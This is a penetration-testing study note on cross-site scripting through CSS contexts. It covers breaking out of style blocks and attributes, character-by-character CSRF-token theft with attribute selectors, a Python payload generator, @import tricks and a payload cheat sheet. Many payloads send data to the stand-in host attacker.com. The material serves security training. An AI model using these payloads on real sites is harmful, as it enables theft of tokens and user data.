---
tags: [vapt, xss, advanced]
difficulty: advanced
module: "07 - XSS"
topic: "07.09 XSS in CSS Context"
---

# 07.09 — XSS in CSS Context

## CSS Context Overview

XSS via CSS is less common than HTML/JS injection but still possible in specific scenarios. CSS cannot directly execute JavaScript in modern browsers — but there are several bypass techniques.

```
CONTEXTS WHERE CSS INJECTION CAN OCCUR:
  1. User input inside <style> block
  2. User input in style="..." HTML attribute
  3. User input in CSS custom properties (variables)
  4. User-uploaded CSS files
  5. Import directives in CSS (SSRF-like)

MODERN BROWSER STATUS:
  CSS expression() → Only worked in IE! (dead)
  CSS binding: → Only worked in Firefox < 3! (dead)
  
  STILL WORKS (modern browsers):
  → Break out of CSS context → inject HTML
  → CSS-based data exfiltration
  → Import to steal CSRF tokens
```

---

## Breaking Out of CSS Context

```html
<!-- ORIGINAL: <style>USER_INPUT</style> -->

<!-- CLOSE STYLE TAG AND INJECT: -->
INJECT: </style><script>alert(1)</script>
RESULT: <style></style><script>alert(1)</script>
        → Closes style, executes script!

<!-- INJECT WITH EVENT HANDLER: -->
INJECT: </style><img src=x onerror=alert(1)>
RESULT: <style></style><img src=x onerror=alert(1)>

<!-- FROM STYLE ATTRIBUTE: -->
ORIGINAL: <div style="color: USER_INPUT;">
INJECT:   red;"></div><script>alert(1)</script>
RESULT:   <div style="color: red;"></div><script>alert(1)</script>
```

---

## CSS Injection for Data Exfiltration

Even without direct JS execution, CSS can exfiltrate data using attribute selectors and background-image requests:

```css
/* STEAL CSRF TOKEN FROM INPUT VALUE ATTRIBUTE: */
/* Sends HTTP request when CSS rule matches! */

input[name="csrf_token"][value^="a"] {
  background: url('https://attacker.com/csrf?v=a');
}
input[name="csrf_token"][value^="b"] {
  background: url('https://attacker.com/csrf?v=b');
}
/* ... repeat for each character */

/* HOW IT WORKS:
   CSS attribute selector: [attr^="prefix"] matches elements where attr STARTS WITH prefix
   If CSRF token starts with "a" → that rule matches → background image loads!
   → Attacker's server receives request → knows CSRF starts with "a"!
   → Repeat for each position character-by-character!
*/

/* AUTOMATED SCRIPT TO GENERATE PAYLOADS: */
/* Each char position: [value^="ab"] (a is known, b = testing) */
```

```python
# GENERATE CSS PAYLOAD FOR CSRF THEFT:
chars = "0123456789abcdefghijklmnopqrstuvwxyz-_"
known = ""  # starts empty, build up character by character

print("<style>")
for c in chars:
    prefix = known + c
    print(f'input[name="csrf_token"][value^="{prefix}"]{{background:url(https://attacker.com/t?c={prefix})}};')
print("</style>")
```

---

## CSS-Based Keylogging

```css
/* CANNOT directly keylog via CSS — but can detect focus: */
input:focus {
  background: url('https://attacker.com/focused');
}

/* Not a real keylogger — just detects element focus */
/* For keylogging, need JS */
```

---

## CSS @import SSRF

```css
/* CSS @import can fetch external stylesheets: */
@import url('https://attacker.com/steal');
/* → Browser fetches attacker.com/steal.css */
/* → Attacker sees request (timing, IP, Referer with URL!) */

/* MORE USEFUL: @import to read internal resources */
@import url('https://intranet.target.com/internal.css');
/* → If intranet is accessible from victim's browser, it fetches it */
/* → Use with CSS exfiltration to steal data from intranet! */
```

---

## CSS background-image for Data Exfiltration

```css
/* STEAL DATA FROM PAGE USING CSS SELECTORS: */

/* Steal page title: */
/* (Only if title text is accessible via CSS) */

/* STEAL HIDDEN INPUT VALUE: */
input[type="hidden"][name="user_id"][value="1"] {
  background: url('https://attacker.com/uid?v=1');
}
input[type="hidden"][name="user_id"][value="2"] {
  background: url('https://attacker.com/uid?v=2');
}
/* → Whichever user ID is in the hidden input triggers a request! */

/* DETECT IF ADMIN CLASS EXISTS: */
.admin-panel {
  background: url('https://attacker.com/is-admin');
}
/* → If admin element exists → request fired! → user is admin! */

/* CHECK IF EMAIL IS VERIFIED: */
.verified-badge {
  background: url('https://attacker.com/verified');
}
```

---

## CSS Injection in Content Security Policy

```
CSP BYPASS VIA CSS:
  If CSP allows unsafe-inline for style but not script:
  style-src 'unsafe-inline'; script-src 'none';
  
  → Cannot inject <script>, but can inject <style>
  → Use CSS for data exfiltration
  → Or: break out of <style> tag with </style><svg onload=alert(1)>
     (event handlers may bypass script-src if not style-src restricted)
```

---

## Mixin/Custom Property Injection

```css
/* CSS CUSTOM PROPERTIES: */
:root {
  --user-color: USER_INPUT;  /* vulnerable! */
}
.element {
  color: var(--user-color);
}

/* INJECT: */
red; background: url('https://attacker.com/exfil');
/* RESULT: */
--user-color: red; background: url('https://attacker.com/exfil');

/* BREAK OUT (if in <style>): */
</style><script>alert(1)</script>
```

---

## Detecting CSS Injection

```bash
# SUBMIT CANARY IN CSS CONTEXT:
# canary: xsscsstest123

# LOOK FOR IN SOURCE:
# <style>...xsscsstest123...</style>  → inside style block
# style="...xsscsstest123..."          → inside style attribute

# TEST BREAK OUT:
?color=red</style><img src=x onerror=alert(1)>
?style=color:red;"></div><script>alert(1)</script>

# TEST CSS EXFIL (verify no encoding on url):
?color=red;background:url(https://attacker.com/test)
# Check if request arrives at attacker.com
```

---

## Practical Payload Reference

```css
/* BREAK OUT OF <style>: */
</style><script>alert(document.domain)</script>
</style><img src=x onerror=alert(1)>
</style><svg onload=alert(1)>

/* BREAK OUT OF style="...": */
red;"></div><script>alert(1)</script>
x}</style><script>alert(1)</script>

/* DATA EXFILTRATION (character-by-character): */
input[value^="a"]{background:url(//attacker.com/a)}
input[value^="b"]{background:url(//attacker.com/b)}

/* IMPORT (SSRF-like): */
@import url(https://attacker.com/evil.css)

/* DETECT ELEMENT (boolean exfil): */
.admin{background:url(https://attacker.com/is-admin)}
#secret-data:not(:empty){background:url(https://attacker.com/has-data)}
```

---

## Related Notes
- [[07 - XSS in HTML Attributes]] — breaking out of attributes
- [[15 - CSP Bypass for XSS]] — CSP and CSS interaction
- [[34 - Content-Security-Policy header]] — CSP configuration
- [[14 - XSS Filter Bypass Techniques]] — general bypasses
